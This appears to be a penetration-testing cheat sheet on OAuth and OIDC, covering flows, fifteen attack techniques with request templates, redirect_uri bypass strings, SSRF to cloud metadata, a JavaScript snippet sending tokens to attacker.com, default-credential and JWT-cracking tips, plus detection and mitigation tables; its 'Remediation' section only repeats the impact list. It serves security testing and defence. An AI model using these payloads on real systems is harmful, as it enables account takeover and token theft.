---
title: OAuth (Open Authorization)
---

# OAuth (Open Authorization)

OAuth is a way for an application to access a user’s data on another service **without knowing the user’s password**, by using **temporary tokens** that grant limited, controlled permissions.

## Fundamentals Of OAuth

OAuth is built on the idea of **delegated authorization** — a user allows one application to access specific resources on their behalf using **tokens instead of passwords**.

- **Client application** — The website or app that wants to access user data.
- **Resource owner** — The user whose data is being accessed.
- **OAuth service provider** — Controls the data and grants tokens via an authorization and resource server.

> **OAuth vs SSO vs OIDC (Quick Reference)**
> 
> - **OAuth** → How access is granted (tokens + permissions)
> - **SSO** → The login experience (one login, many apps)
> - **OIDC** → Authentication pattern built on top of OAuth

## The types of Oauth Flows:

1. Authorization Code Flow
2. Authorization Code Flow with PKCE
3. Implicit Flow (deprecated)
4. Client Credentials Flow
5. Resource Owner Password Credentials (ROPC) Flow
6. Device Authorization Flow (Device Code Flow)

> ⚠️ **Implicit Flow is deprecated** in OAuth 2.1. Always prefer Authorization Code + PKCE for SPAs and mobile apps.
> 

### 1. Authorization Code Flow

**Authorization Code Flow** is an OAuth flow where a user logs in, the authorization server returns a short-lived **authorization code**, and the application’s backend exchanges that code for an **access token**.

User authenticates → app gets a temporary code → backend swaps the code for tokens.

### 2. **Authorization Code Flow with PKCE**

**Authorization Code Flow with PKCE** is a secure version of the Authorization Code Flow where the app adds a cryptographic proof (called a `code_verifier`) to prevent authorization code interception.

User logs in → app gets a temporary authorization code → app must prove it originally requested that code (using PKCE) before exchanging it for tokens.

### 3. Implicit flow

**Implicit Flow is an OAuth 2.0 grant type where the access token is returned directly to the browser instead of first issuing an authorization code.**

User logs in → authorization server immediately returns an access token in the browser URL.

### **4.** Client Credentials Flow

**Client Credentials Flow** is an OAuth 2.0 flow where an application obtains an access token using its own credentials, without any user involvement.

### 5. Resource Owner Password Credentials (ROPC) Flow

**Resource Owner Password Credentials (ROPC) Flow** is an OAuth 2.0 flow where the user provides their **username and password directly to the application**, and the application sends those credentials to the authorization server to obtain an access token.

User gives username and password to the app → app forwards them to the token endpoint → server returns an access token.

### 6. Device Authorization Flow (Device Code Flow)

**Device Authorization Flow (Device Code Flow)** is an OAuth 2.0 flow designed for devices that have limited input capability, like smart TVs or CLI tools.

The device shows the user a code → the user visits a verification URL on another device (like a phone or laptop) → logs in and approves access → the original device receives an access token.

## OAuth Attack Surface

Common areas to look for OAuth misconfigurations:

- **`redirect_uri` parameter** — Open redirect / token hijacking
- **`state` parameter** — Missing or predictable = CSRF
- **`scope` parameter** — Scope escalation by modifying the request
- **`response_type` parameter** — Downgrade attacks (e.g., code → token)
- **Authorization endpoint** — Misconfigured allow-list for redirect URIs
- **Token endpoint** — Weak client secret, no PKCE enforcement
- **Third-party integrations** — "Login with Google/GitHub" misuse
- **Logout endpoint** — Missing CSRF protection on logout
- **Referer header on token exchange page** — Token leakage

## Exploiting OAuth

### 1. Authentication Bypass via OAuth Implicit Flow

OAuth Implicit Flow returns the **access token directly in the browser URL** (`response_type=token`). If the application treats this token as **proof of authentication** (not just authorization), an attacker can replay or inject any valid token to bypass login.

**Exploit:**

```
# Step 1: Trigger implicit flow
GET /authorize?client_id=client123&response_type=token&redirect_uri=https://app.example.com/callback&scope=openid email

# Step 2: Token lands in browser URL
<https://app.example.com/callback#access_token=eyJhbGciOi>...

# Step 3: Attacker replays a stolen or their own token
GET /callback#access_token=ATTACKER_OR_STOLEN_TOKEN
```

**Vulnerable if:** App logs the user in solely by receiving a token without verifying its origin.

---

### 2. OAuth Account Hijacking via `redirect_uri` Manipulation

The OAuth server **fails to strictly validate the `redirect_uri`**, allowing the attacker to redirect the authorization code or token to their own server.

**Exploit:**

```
# Append attacker domain to legitimate domain name
GET /authorize?client_id=client123&response_type=code
  &redirect_uri=https://app.example.com.attacker.com/callback
  &scope=openid email
```

**Alternate bypass variations** (move these to payload section when testing):

```
<https://app.example.com/callback/../attacker>
<https://app.example.com>%2F.attacker.com
<https://app.example.com@attacker.com/callback>
```

---

### 3. Forced OAuth Profile Linking

Application **automatically links an OAuth identity to an existing logged-in account without user confirmation**. If the app relies only on OAuth response data (email/user ID) without verifying intent, an attacker can bind their account to a victim's.

**Exploit:**

```
# Attacker completes OAuth auth on their own account
# Then tricks the victim (who is logged in) into visiting the attacker's callback URL
GET /oauth/callback?code=ATTACKER_AUTH_CODE&state=VALID_STATE
```

**Vulnerable if:** App silently links the attacker's OAuth identity to the victim's active session.

---

### 4. Stealing OAuth Access Tokens via Open Redirect

The `redirect_uri` is correctly whitelisted, **but the endpoint itself contains an open redirect**. The OAuth server sends the token to the legitimate endpoint, which then forwards it to the attacker.

**Exploit:**

```
GET /authorize?client_id=client123&response_type=token
  &redirect_uri=https://app.example.com/callback?next=https://attacker.com
  &scope=openid email

# App receives token then performs open redirect:
<https://app.example.com/callback?next=https://attacker.com#access_token=eyJhbGciOi>...
```

**Key insight:** The `redirect_uri` passes server validation, but the redirect endpoint is the weak link.

---

### 5. Stealing OAuth Access Tokens via Proxy Page

The `redirect_uri` points to a **trusted page that silently leaks the token** via JavaScript/iframe/postMessage — without navigating away (no visible redirect).

**Exploit:**

```
GET /authorize?client_id=client123&response_type=token
  &redirect_uri=https://app.example.com/oauth-proxy
  &scope=openid email
```

**Vulnerable proxy page (JS on the callback page):**

```html
<script>
  // Token is in the URL fragment — silently sent to attacker
  fetch('<https://attacker.com/log?token=>' + location.hash);
</script>
```

**Other exfiltration methods:** `XHR`, `<iframe>`, `window.postMessage` to an attacker-controlled listener.

---

### 6. SSRF via OpenID Dynamic Client Registration

OpenID Provider allows **dynamic client registration** without validating client-supplied URLs (`logo_uri`, `jwks_uri`, `redirect_uris`). Attacker supplies an internal/cloud-metadata URL — the server fetches it, triggering SSRF.

**Exploit:**

```
POST /connect/register HTTP/1.1
Host: idp.example.com
Content-Type: application/json

{
  "client_name": "evil-client",
  "logo_uri": "<http://169.254.169.254/latest/meta-data/>",
  "redirect_uris": ["<https://attacker.com/callback>"]
}
```

**Other SSRF target URLs to try:**

```
<http://localhost>
<http://127.0.0.1>
http://[::1]
<http://internal-service.local>
```

**Vulnerable if:** Server makes a network request to fetch `logo_uri` or `jwks_uri`.

---

### 7. Login CSRF via Missing `state` Parameter

Without a `state` parameter, the app **cannot verify that the OAuth response belongs to the user who started the flow**. An attacker completes OAuth on their own account and tricks the victim into visiting the callback → victim is logged into attacker's account.

**Exploit:**

```
# Step 1: Attacker initiates flow without state
GET /authorize?client_id=client123&response_type=code
  &redirect_uri=https://app.example.com/callback
  &scope=openid email

# Step 2: Attacker sends their own callback URL to the victim
Victim visits: <https://app.example.com/callback?code=ATTACKER_CODE>
```

**Vulnerable if:** Login succeeds even when `state` is missing or not validated.

---

### 8. Authorization Code Replay

OAuth authorization codes are meant to be **single-use and short-lived**. Weak server-side validation allows the **same code to be exchanged multiple times** for fresh tokens.

**Exploit:**

```
# Exchange 1 (legitimate)
POST /token HTTP/1.1
grant_type=authorization_code&code=AUTH_CODE_123
  &redirect_uri=https://app.example.com/callback&client_id=client123&client_secret=secret

# Exchange 2 (replay — use exact same code again)
POST /token HTTP/1.1
grant_type=authorization_code&code=AUTH_CODE_123
  &redirect_uri=https://app.example.com/callback&client_id=client123&client_secret=secret
```

**Vulnerable if:** A new access token is returned on the second request.

---

### 9. OAuth Token Substitution Attack

App accepts a valid OAuth token but **fails to verify it belongs to the correct user or client**. Missing checks on `aud` (audience), `iss` (issuer), or user binding allow an attacker's token to authenticate a different session.

**Exploit:**

```
# Try attacker's token on victim's session/endpoint
GET /login/callback?access_token=ATTACKER_VALID_TOKEN

# Or on an authenticated API endpoint
GET /api/user/profile
Authorization: Bearer ATTACKER_VALID_TOKEN
```

**What makes it vulnerable:**

- Token issued for a different client (`aud` not checked)
- Token from a different IdP (`iss` not checked)
- Token not bound to a specific user session

---

### 10. Email Trust Abuse in OAuth Login

App **trusts the email from the OAuth provider without checking `email_verified`**. Some providers allow users to set unverified emails. App uses email as the sole identifier to find or create accounts.

**Exploit scenario:**

1. Attacker creates an OAuth account at any provider.
2. Sets email to `victim@example.com` (unverified or provider allows changes).
3. Uses "Login with OAuth" on the target app.

**OAuth user info response returned:**

```json
{
  "email": "victim@example.com",
  "email_verified": false
}
```

**Vulnerable if:** App ignores `email_verified: false` and logs the attacker in as the victim.

**Indicators of vulnerability:**

- App does not check `email_verified`
- App auto-links accounts based only on email match
- No secondary verification (OTP / confirmation email)

---

### 11. ID Token Claim Manipulation (OIDC)

Application **does not validate claims inside the OIDC ID token**. Claims like `iss`, `aud`, `sub`, `exp`, or `nonce` are absent or ignored, allowing attackers to forge tokens.

**Exploit (forged ID token payload):**

```json
{
  "iss": "<https://attacker-idp.com>",
  "aud": "victim-app",
  "sub": "victim-user-id",
  "email": "victim@example.com",
  "exp": 9999999999
}
```

Signed using a weak key, mismatched issuer, or `alg=none`.

**Bypass conditions:**

- `iss` not validated → attacker IdP token accepted
- `aud` not checked → token for another app reused
- `nonce` not validated → replayed login accepted
- `alg=none` accepted → unsigned token works

---

### 12. Missing PKCE Leading to Code Interception

**Without PKCE**, anyone who intercepts the authorization code can exchange it for tokens — the server has no way to verify the code was requested by the same party that is now claiming it.

**Exploit:**

```
# Legitimate auth request — no code_challenge present
GET /authorize?client_id=client123&response_type=code
  &redirect_uri=https://app.example.com/callback&scope=openid email

# Attacker intercepts code in transit
<https://app.example.com/callback?code=STOLEN_CODE>

# Attacker redeems stolen code (no code_verifier needed)
POST /token HTTP/1.1
grant_type=authorization_code&code=STOLEN_CODE
  &redirect_uri=https://app.example.com/callback&client_id=client123
```

**Vulnerable if:** Token is returned without requiring `code_verifier`.

---

### 13. Refresh Token Reuse Without Rotation

Refresh tokens should be **single-use and rotated on each use**. If the same token keeps working, a stolen refresh token gives the attacker **persistent access indefinitely**, surviving password changes and logouts.

**Exploit:**

```
# Use refresh token once (legitimate)
POST /token HTTP/1.1
grant_type=refresh_token&refresh_token=REFRESH_TOKEN_ABC
  &client_id=client123&client_secret=secret

# Use the same refresh token again (should fail, but doesn't)
POST /token HTTP/1.1
grant_type=refresh_token&refresh_token=REFRESH_TOKEN_ABC
  &client_id=client123&client_secret=secret
```

**Vulnerable if:** New access token is issued on the second request.

**What makes it vulnerable:**

- No refresh token rotation after use
- No reuse detection or revocation
- No token revocation triggered on logout

---

### 14. OAuth Discovery Endpoint Poisoning

App **blindly trusts `/.well-known/openid-configuration`** without validating the issuer or pinning the metadata. If the discovery response can be tampered with or spoofed, the attacker can inject malicious endpoints or signing keys.

**Exploit (attacker-controlled discovery response):**

```json
{
  "issuer": "<https://attacker-idp.com>",
  "authorization_endpoint": "<https://attacker-idp.com/authorize>",
  "token_endpoint": "<https://attacker-idp.com/token>",
  "jwks_uri": "<https://attacker-idp.com/jwks.json>"
}
```

App fetches attacker metadata → trusts tokens signed by attacker's keys.

**Vulnerable conditions:**

- No validation of the `issuer` field
- Dynamic discovery enabled without an allowlist
- JWKS fetched from any domain without pinning

---

### 15. Client Impersonation via Leaked Client Credentials

`client_id` and `client_secret` exposed in source code, mobile APKs, JS bundles, logs, or public repositories. With valid credentials, the attacker **impersonates the trusted OAuth client application**.

**Where to look:**

- JavaScript source files and bundled frontend code
- Decompiled mobile APK (`strings`, `jadx`, `apktool`)
- GitHub searches: `client_secret`, `oauth_secret`, org name

**Exploit:**

```
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&client_id=LEAKED_CLIENT_ID
  &client_secret=LEAKED_CLIENT_SECRET&scope=openid profile
```

**Vulnerable if:** Token is issued — attacker now acts as the legitimate app.

## OAuth Bypasses & Obfuscation

### 1. `redirect_uri` Bypass Techniques

```
# Subdomain confusion
<https://attacker.com.legit.com/callback>

# Path traversal on redirect_uri
<https://legit.com/callback/../attacker>

# Open redirect chaining
<https://legit.com/redirect?url=https://attacker.com>

# URL fragment bypass
<https://legit.com/callback#https://attacker.com>

# Parameter pollution
redirect_uri=https://legit.com&redirect_uri=https://attacker.com
```

### 2. State Parameter Bypass

```
# Remove state entirely → CSRF
GET /authorize?client_id=X&redirect_uri=Y&response_type=code
# (no &state= parameter)

# Predictable state value → forge it
state=12345 or state=user123
```

### 3. Scope Escalation

```
# Original request
scope=read

# Modified request — request additional privileges
scope=read write admin

# Try known undocumented scopes
scope=openid profile email offline_access
```

## Additional Advanced Attack Scenarios

### 1. PKCE Downgrade Attack

Force the server to fall back from PKCE to no-PKCE, making the authorization code interceptable.

```
# Step 1: Start a legitimate PKCE flow — note the code_challenge
GET /authorize?client_id=X&code_challenge=xxxx&code_challenge_method=S256&...

# Step 2: Send a fresh request WITHOUT PKCE params
GET /authorize?client_id=X&redirect_uri=Y&response_type=code&scope=openid

# Step 3: If server returns a code, try to exchange it WITHOUT code_verifier
POST /token
  code=INTERCEPTED_CODE&client_id=X&redirect_uri=Y
```

**Vulnerable if:** Server accepts the token exchange without demanding `code_verifier`.

---

### 2. OAuth Logout CSRF

If the logout endpoint lacks CSRF protection and uses a GET request:

```html
<!-- Attacker page auto-logs out victim from a service -->
<img src="<https://legit.com/oauth/logout?token=X>" />

<!-- Or silently de-authorize the victim's connected app -->
<img src="<https://legit.com/oauth/revoke?client_id=victim_app>" />
```

---

### 3. Token Leakage via Referer Header

When a token is placed in the URL (e.g., Implicit flow) and the page loads third-party resources:

```
1. Victim receives: <https://app.com/callback#access_token=SECRET>
2. Page loads: <script src="<https://analytics.com/track.js>">
3. Referer header sent: Referer: <https://app.com/callback#access_token=SECRET>
4. Token leaked to third party
```

**Test for:** Check if `access_token` or `code` appears in URLs, then observe outbound Referer headers.

---

### 4. Framework-Specific Misconfigurations

#### Keycloak

```
# Wildcard redirect_uri (catastrophic misconfiguration)
redirect_uri=*

# Exposed admin console — try default credentials (admin/admin)
GET /auth/admin/master/console/

# Public clients with blank client secret (should never be empty)
client_authenticator_type=client-secret  → check if blank
```

#### Auth0

```
# Wildcard in "Allowed Callback URLs"
https://*.attacker.com/callback

# JWT alg:none (older Auth0 tenants)
{"alg":"none","typ":"JWT"}

# Brute force weak signing secret
jwt-cracker -t <token> -a "abcdefghijklmnopqrstuvwxyz"
```

#### Spring Authorization Server

```
# CSRF on authorization endpoint (older versions)
# Missing PKCE enforcement for public clients

# Exposed token introspection — leaks token details
GET /oauth2/introspect?token=<token>
```

## Test Cases

| Scenario | Action | Expected Outcome |
| --- | --- | --- |
| Open Redirect via `redirect_uri` | Change `redirect_uri` to attacker domain | Token sent to attacker; report if accepted |
| CSRF via missing `state` | Remove `state` param from auth request | Auth flow completes without state validation |
| Scope Escalation | Add `admin` or `write` to `scope` | Server grants extra permissions |
| PKCE Downgrade | Remove `code_challenge` params | Server issues code without PKCE enforcement |
| Token in URL (Implicit) | Inspect URL after redirect | `access_token` visible in URL fragment |
| Logout CSRF | Embed logout URL in img tag on attacker page | Victim is logged out cross-site |
| Reuse of Authorization Code | Replay `code` after exchange | Server should reject; if reused = vulnerable |
| Client Secret Exposure | Check JS source / mobile APK decompile | Hardcoded `client_secret` found |
| Token Leakage via Referer | Load third-party resource after token redirect | Referer header contains token |
| JWT `alg:none` | Modify JWT header to `"alg":"none"`, remove signature | Server accepts unsigned token |

## Detection Techniques

### A. Manual Detection

1. **Intercept all auth requests** — In Burp Suite, review `redirect_uri`, `state`, `scope`, `response_type` in every OAuth request.
2. **Modify `redirect_uri`** — Try attacker domain, subdomain confusion, path traversal, encoded characters.
3. **Remove `state` param** — If the OAuth flow completes, CSRF is possible.
4. **Modify `scope`** — Add `admin`, `write`, `offline_access` and observe what the server grants.
5. **Drop PKCE params** — Remove `code_challenge` / `code_verifier` from the flow and retry token exchange.
6. **Decode JWTs** — Use [jwt.io](https://jwt.io/); check `alg`, `iss`, `aud`, `exp`, and `nonce`.
7. **Test logout endpoint** — Make a GET request from a different origin; check if CSRF token is required.
8. **Check URL fragments** — Look for `access_token` in URLs; observe outgoing `Referer` headers in third-party requests.
9. **Dynamic client registration** — If the endpoint exists, register a client with `logo_uri` pointing to an internal IP.

### B. Automated Detection

| Tool | Usage |
| --- | --- |
| **Burp Suite** (Intruder, Repeater) | Fuzz `redirect_uri`, `state`, `scope` parameters |
| **OWASP ZAP** | Active scan OAuth endpoints |
| **jwt_tool** | Audit JWTs — `alg:none`, weak secret brute force, claim manipulation |
| **Nuclei** | Templates for known OAuth misconfigurations |
| **Postman** | Step through full OAuth token exchange flows manually |

## Impact of OAuth & SSO Attacks

- **Authentication Bypass** Attackers can log in without usernames or passwords.
- **Account Takeover (ATO)** Victim accounts can be fully compromised using stolen or manipulated tokens.
- **Forced Account Linking** Attacker identities get permanently linked to victim accounts.
- **Unauthorized Access to User Data** Private profile data, emails, and sensitive resources can be accessed.
- **Persistent Access** Refresh token abuse allows long-term access even after logout or password change.
- **Impersonation Across Applications (SSO Impact)** One compromised OAuth flow can grant access to multiple connected apps.
- **Privilege Escalation**Abuse of scopes or client impersonation can lead to admin or elevated access.
- **Token Theft & Replay** Access tokens reused to repeatedly authenticate as victims.
- **Infrastructure Compromise** SSRF via OAuth can expose internal services or cloud metadata.
- **Trust Chain Breakdown** Compromising a trusted identity provider affects all dependent applications.

## Remediation for OAuth & SSO Vulnerabilities

- **Authentication Bypass** — Attackers log in without credentials.
- **Account Takeover (ATO)** — Victim accounts fully compromised via stolen/manipulated tokens.
- **Forced Account Linking** — Attacker identities permanently linked to victim accounts.
- **Unauthorized Data Access** — Private profile data, emails, and sensitive resources exposed.
- **Persistent Access** — Refresh token abuse gives long-term access even after logout or password change.
- **Impersonation (SSO Impact)** — One compromised OAuth flow grants access to all connected apps.
- **Privilege Escalation** — Scope abuse or client impersonation leads to admin-level access.
- **Infrastructure Compromise** — SSRF via OpenID dynamic registration exposes internal services and cloud metadata.
- **Trust Chain Breakdown** — Compromising a trusted IdP affects every relying application.

## Mitigation & Prevention

| Control | Detail |
| --- | --- |
| **Auth Code + PKCE** | Avoid Implicit flow. Enforce PKCE for all public clients (mobile, SPA). |
| **Strict `redirect_uri`** | Allow only exact, pre-registered URIs. No wildcards, partial matches, or open redirects. |
| **Enforce `state` & `nonce`** | Generate cryptographically random values. Reject missing or mismatched values. |
| **Validate all tokens** | Verify `iss`, `aud`, `exp`, `nbf`, and signatures. Reject `alg=none`. |
| **Bind codes & tokens** | Codes must be single-use. Tokens must be bound to client and session. |
| **Rotate refresh tokens** | Invalidate refresh token on each use. Revoke on logout. |
| **Verify email ownership** | Require `email_verified=true` before linking/creating accounts. |
| **Secure client registration** | Validate all URL fields (`logo_uri`, `jwks_uri`). Disable dynamic registration if unused. |
| **Protect client secrets** | Never expose in frontend, mobile, or public repos. Rotate immediately if leaked. |
| **Least-privilege scopes** | Minimal scopes, short token lifetimes, explicit scope validation on each request. |
| **Logging & monitoring** | Log OAuth events — token reuse, failed validations, abnormal patterns. |

## Good To Read

- **HackerOne Hacktivity**
    - [https://hackerone.com/reports/1074047](https://hackerone.com/reports/1074047)
    - [https://hackerone.com/reports/665651](https://hackerone.com/reports/665651)
    - [https://hackerone.com/reports/1212374](https://hackerone.com/reports/1212374)

## References

- https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html
- https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets_draft/OAuth_Cheat_Sheet.md
- [doyensec_OAuth_Cheat_Sheet](https://doyensec.com/resources/Doyensec_OAuth_CheatSheet.pdf)
- [Y-Security performs Attack Simulations, Penetration Tests, and Security Trainings](https://pentest.y-security.de/OWASP%20Cheat%20Sheet%20Series/OAuth2_Cheat_Sheet/)
- https://pragmaticwebsecurity.com/files/cheatsheets/oauth2securityfordevelopers.pdf[Authentication Cheatsheet - DEV Community](https://dev.to/balajisasikumar/authentication-cheatsheet-35lp)
- [RFC 6749: The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)
- [OAuth_2.0_and_OpenID_Connect__The_Professional_Guide_Feb6.pdf](https://assets.ctfassets.net/2ntc334xpx65/7D1vaJ4Q908Th0iklEkFWs/d4a6ebeb2814000214da88a224c9b2f4/OAuth_2.0_and_OpenID_Connect__The_Professional_Guide_Feb6.pdf)